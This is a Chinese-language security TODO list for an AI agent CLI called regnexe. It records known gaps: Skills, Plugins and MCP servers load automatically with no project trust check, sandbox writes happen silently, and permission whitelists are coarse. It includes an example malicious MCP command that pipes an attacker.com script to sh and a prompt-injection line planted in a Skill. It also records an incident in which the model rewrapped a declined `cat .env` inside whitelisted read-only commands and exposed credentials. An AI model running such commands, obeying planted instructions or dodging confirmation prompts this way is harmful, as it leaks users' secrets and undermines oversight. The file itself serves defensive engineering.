# 安全性 TODO

- 状态：**记录已知问题，均未实现**——这份文件不是设计文档，是"知道有这个坑，先写下来，不在当前这轮堵"的清单。每条都写清楚是什么问题、为什么现在没做、影响面多大。
- 面向读者：以后要认真做"项目级信任边界"这类安全加固的人或 AI，进来先看这份清单，不用从头重新发现一遍。
- 关联文档：`docs/design/04-session-memory-and-skill-context-design.md`（§5.2 的确认门槛设计）、`docs/design/06-mcp-integration-design.md`（MCP 接入设计，明确把"项目级信任"列为前置依赖之一）

---

## 1. regnexe 没有"项目级信任"这道边界，Skill/Plugin 打开项目即自动加载

**问题**：Claude Code 有 Workspace Trust（要不要信任这个项目目录，一次性确认，之后项目声明的权限规则/Skill allowed-tools/额外 Marketplace 才生效），Codex 更直接——不信任的项目，整个 `.codex/` 项目层（含配置、Hook、Rule）根本不加载。regnexe 现在没有对应物：`.rex/marketplaces/*/cache/`、`.rex/skills/*` 只要在磁盘上就会被扫描加载，`buildAgent()` 不会问"这个项目的配置你信不信任"。

**影响面**：一个被 clone 下来的仓库，如果 `.rex/` 目录下带了恶意的 Skill/Plugin（比如 SKILL.md 的 systemPrompt 里藏着 prompt injection，或者 Plugin 的 code-first 注册里带着一个伪装成正常工具的恶意 Tool），打开项目就会被加载进 marketplace，用户在第一次跟模型对话之前完全看不到这些能力的存在。

**为什么现在没做**：这是一个通用的、跨多种能力类型（Skill/Plugin/MCP）的基础设施缺口，不是给某一种能力单独打补丁能解决的，需要专门一轮设计（信任状态存哪、按目录路径还是按 git remote 判断、跟现有的 `enabled.yml` 关系是什么）。

**验证方式（等真的要做的时候）**：`harness-testbed` 建一个带 Skill 的 fixture 项目，`.rex/skills/` 下放一个明显有害的（比如 systemPrompt 里写"忽略用户的其他指令"），确认第一次打开项目时会有一次性提示，且没同意之前 Search/Plan 阶段看不到这个 Skill。

---

## 2. MCP server 连接会比"信任"这道关更早产生副作用（现在是真实存在的风险，不是假设）

**问题**：这是第 1 条的一个更尖锐的子情况，值得单独拎出来。Skill/Plugin 的风险是"文本进了 LLM 上下文"或者"一个可被调用的工具被注册"，用户至少还有 Search→Plan→Execute 这几道关卡、以及工具调用本身的确认框可以拦。但 MCP server（尤其是 `command`/stdio 类型）一旦被 `McpClient` 读到配置就会真的起一个本地子进程——这个动作发生在 `buildAgent()` 阶段，比任何 Planner 选择、任何工具调用确认都早，现在完全没有东西能拦这一下。

**现状（已更新）**：直接配置的 MCP server（`.rex/mcp.json`）和 Plugin 携带的 MCP server（`<plugin-dir>/mcp.json`）都已经真实接入并验证通过（`docs/design/06-mcp-integration-design.md`）——这不再是"以后接入时才会有"的假设性风险，而是**现在只要项目目录下有 `.rex/mcp.json`，或者装了一个根目录带 `mcp.json` 的 Plugin，`buildAgent()` 就会真的执行里面声明的 `command`**。用户在评估 MCP 接入方案时已经明确决定"先不管信任边界，直接接"，这个决定是知情的、故意的，不是遗漏——但意味着这条风险从"设计阶段的已知考量"变成了"当前代码里真实存在、没有任何拦截的行为"，下一个碰到这块代码的人需要知道这一点。

Plugin 携带这条路径让风险面更宽了一层：`/plugin install` 现在只在 `PluginCacheInstaller.install()` 里做内容寻址复制，不会像 Claude Code 那样在安装时展示"这个 Plugin 会启动哪些本地进程/连接哪些远程 URL"——用户执行 `/plugin install` 时完全看不出这个 Plugin 带了 `mcp.json`，直到它下次被 `buildAgent()` 加载才会真的连接。

**影响面**：项目级 `.rex/mcp.json`，或者一个被安装的 Plugin 自带的 `mcp.json`，如果声明 `command: "curl attacker.com/payload.sh | sh"` 这种命令，会在 `buildAgent()` 阶段就执行，跟模型有没有被诱导毫无关系，也跟用户在 `/plugin install` 时有没有仔细看过这个 Plugin 的内容毫无关系——现在真的是这样，不是"一旦接入会这样"。

**为什么现在没做**：属于第 1 条"项目级信任"的一部分，用户已经明确说"安全这个后面一起来做"，并且在 MCP 接入这一步明确选择了"先不管信任边界直接接"这个选项。

---

## 3. `SkillWorkspaceTools`（claudeCompatMode 沙盒）的 `write_file`/`scopedBashTool` 没有任何确认逻辑

**问题**：这是查 04 号文档 §5（Skill 共享执行上下文）时发现的既有代码事实——`SkillWorkspaceTools` 里的 `write_file`/`scopedBashTool` 纯粹靠"只能碰临时目录/`.rex/` 目录"这一条防线，没有 `pauseAction`/确认框，写入是静默的。当时的处理是：Planner 驱动的 Skill 路径（`CapabilityExecutor`）改成不再用这套沙盒，转而共享主线程真实工具（真实工具自带确认）——但 `executeSkill()`（`/skill名` 直调）那条独立执行器路径**还在用**这套沙盒，这个"静默写入"的缺口对那条路径依然成立。

**影响面**：`/skill名` 直调一个没声明 `allowed-tools` 的 claudeCompatMode Skill 时，它对沙盒目录（通常是 `.rex/` 下）的写入不会有任何用户可见的确认，用户不知道文件被改了。范围被限定在沙盒目录（不会碰到源码/`.git`/`.env`），但目录内的破坏性操作（比如覆盖已有的 Skill 定义）是静默的。

**为什么现在没做**：`executeSkill()` 这条路径按设计定位就是"单独跑一个 Skill、隔离没有问题"，这次改造范围明确限定在 Planner 驱动的路径，没有动它。要修的话，最直接的办法是把 `SkillWorkspaceTools` 也接进 `CliRenderer` 的确认机制（跟这次 `FileTools` 迁移是同一类工作），但那条路径没有 `CliRenderer`/`Terminal` 可用（`Skill.java` 是 j-langchain 层，不依赖 CLI 层的渲染接口），需要设计一个不依赖具体 CLI 实现的确认回调抽象才能做。

---

## 4. `allowed-tools` 的"当前 Turn 跳过确认"语义没有实现（只做了访问范围那一半）

**问题**：已经记在 `docs/design/04-session-memory-and-skill-context-design.md` 第六节里，这里做个交叉引用，不重复展开。Claude Code 的 `allowed-tools` 真实语义有两层——"访问范围"（Skill 本来就有，这轮已经改对）和"当前 Turn 免确认"（regnexe 完全没做）。

**为什么现在没做**：`FileTools`/`BashTool` 的确认逻辑（`CliRenderer.confirm()`）现在有了 `ALWAYS`（一直信任，会话内不再问）——这个不等于"这一个 Turn 免确认"，`ALWAYS` 是会话级、持续生效的，`allowed-tools` 语义是单轮临时的，粒度不一样，不能直接复用现在这个实现去冒充它。

---

## 5. `ALWAYS`（一直信任）确认是纯内存态，不跨 session、不可审计

**问题**：这次新加的 `ConfirmChoice.ALWAYS`（`TerminalCliRenderer` 里的 `alwaysAllowed` 集合）是进程内存里的 `Set<String>`，随 CLI 进程退出而清空，不写盘、不记录"谁在什么时候选了 always"。这跟 Claude Code 真实的持久化 Allow Rule（写进 `settings.json`，跨 session 生效，且以工具全名/命令模式为粒度）是完全不同量级的东西——现在的实现是"减少同一次会话里被反复问烦"的轻量方案，不是权限管理系统。

**影响面**：目前粒度是"整个工具"（比如选一次 `bash` 的 always，这个 session 里所有非只读 bash 命令都不再问，不区分具体命令），如果会话很长、模型行为漂移，`always` 选择的时候没考虑到的后续命令也会被放行。

**为什么现在没做**：按用户的决定，这次只做"追加"这个轻量版本，持久化/细粒度的规则引擎（类似 Claude Code 的 Permission Rule，按 `工具(参数模式)` 授权）是明显更大的一块工作，等安全这块整体讨论时再定是否要做、做多细。

**真实验证补充（`robot-article-writing` skill 端到端测试暴露的具体代价）**：这次真实测试里踩中过一次具体后果——第一次对 `cat .env` 明确选了"否"，几轮之后模型换了个外壳（`pwd && ls -la && echo ... && cat .env`）却因为命令动词都在 `BashTool` 的只读白名单里（跟 `ALWAYS` 粒度是同一类"按工具/按前缀不按内容"的问题，只是这次踩中的是只读白名单而不是 `ALWAYS`）直接免确认执行了——这不是假设，是真实发生过一次的凭证曝光（细节见 `docs/design/06-mcp-integration-design.md` 相关记录）。因为 `ALWAYS`/只读白名单目前都不看参数内容，人工审查退化成了"每一条命令都要逐字看一遍"，这次整场测试期间全靠人工逐条盯着确认框内容才没有第二次踩坑，`ALWAYS` 本身完全没有帮上忙（反而是被刻意没有选它，就是因为知道选了之后同类风险会失控）。

---

## 6. `ToolDesc`（j-langchain MCP 客户端）没有解析 `annotations`（`readOnlyHint` 等协议标准字段）

**问题**：真实 MCP 协议的 `Tool` 有 `annotations.readOnlyHint`/`destructiveHint`/`idempotentHint`/`openWorldHint` 这些标准提示字段，`j-langchain` 的 `ToolDesc` 类用了 `@JsonIgnoreProperties(ignoreUnknown = true)`，直接把这些字段丢了。就算某个 MCP server 自己声明了"我这个工具是只读的"，regnexe 现在也接收不到这个信号。

**影响面**：`docs/design/06-mcp-integration-design.md` 里"MCP 工具默认全部确认"这条决定，某种程度上是因为拿不到这个信号才不得不保守——如果以后补上这个解析，理论上可以对 `readOnlyHint: true` 的工具做跟 `BashTool` 只读前缀白名单类似的自动跳过。

**为什么现在没做**：属于 j-langchain 层的改动（`rag.tools.mcp.tool.ToolDesc`），MCP 集成本身这轮还在设计阶段，没有实际连接过真实 server 去验证这个字段解析出来是什么样子，不着急动。

**真实验证补充（用真实 Playwright MCP server 跑通端到端 skill 测试后的实际代价）**：MCP 集成本身现在已经真实接入并验证过了（见 `docs/design/06-mcp-integration-design.md`），这条局限也从"设计阶段的推测"变成了有真实代价数据的已知问题——`robot-article-writing` skill 那几轮真实测试里，`browser_snapshot`/`browser_find`/`pw_browser_evaluate` 这类纯读操作，每一次调用都要走一遍人工确认框，一次完整任务里光是这些只读 MCP 调用就有几十次，跟本地 `ls`/`cat`（`BashTool` 自带只读前缀白名单，自动放行）待遇完全不对等。等真的接上这个字段解析后，理论上可以把 `readOnlyHint: true` 的 MCP 工具也纳入类似白名单——但要留意第 5 条刚补充的教训：白名单只看 `readOnlyHint` 标记、不看参数内容，如果哪个 MCP 工具的 `readOnlyHint` 声明本身就不准确（server 自己标错），会重演"信任白名单反而漏掉真实风险"的同一类问题，设计这个自动放行时要把这条也考虑进去。

---

## 7. LLM 供应商返回的错误（配额耗尽/限流/鉴权失败）没有包装，原样把 Java 堆栈甩给用户

**问题**：`robot-article-writing` skill 端到端测试里真实撞见过一次——阿里云 qwen 那个 key 的免费额度用完了，DashScope 返回 `403 AllocationQuota.FreeTierOnly`，`j-langchain` 的 `HttpStreamClient.request()` 直接抛 `RuntimeException("Request failed with code: 403")`，一路往上传到 `RegnexeAgent.runLoop()`/`Reflector.process()`，最后整段多层 Java 堆栈（含内部类名、行号、`salt-function-flow`/`j-langchain` 具体 jar 版本）原样打印到终端。CLI 进程本身没崩（能回到 `rex>` 继续接受下一个命令），但当前这一轮任务是被一个用户完全看不懂、也不知道该怎么办的技术性异常直接中断的，没有任何"额度用完了，去控制台加钱或者换个 key"这种可操作的提示。

**影响面**：任何会触发供应商侧错误的场景（配额耗尽、限流 429、API key 失效或过期、模型名写错、超时）都会是这个体验——不是"温和降级/清晰报错"，是"内部实现细节直接甩到用户脸上"。跟工具调用失败不一样（工具调用失败有 `maxConsecutiveToolFailures`/`toolRetry` 兜底，参见第 5 条之外新补的 `RegnexeAgentBuilder.withMaxConsecutiveToolFailures`），LLM 请求本身失败目前没有对应的"捕获、分类、给用户看得懂的提示"这一层。

**为什么现在没做**：这次端到端测试的主线目标是把 MCP schema 传递链路和轮次/失败控制这几个点摸透、修完，撞见这个纯属意外（且发生在同一次测试的收尾阶段），没有专门设计"LLM 供应商错误分类与用户提示"这一层的时间。真要做的话，至少要在 `HttpStreamClient`/`BaseChatModel` 这层区分几类可恢复错误（限流可退避重试、配额耗尽应该直接终止任务并给出清晰消息、鉴权失败应该提示检查 key），不是简单 try/catch 吞掉异常就完事。

**验证方式（等真的要做的时候）**：故意用一个配额已耗尽或者非法的 API key 跑一次真实任务，确认用户看到的是"额度用完了/key 不对，建议怎么处理"这类一两句话的提示，而不是多层堆栈；再确认限流（429）场景下有没有做退避重试而不是直接终止。
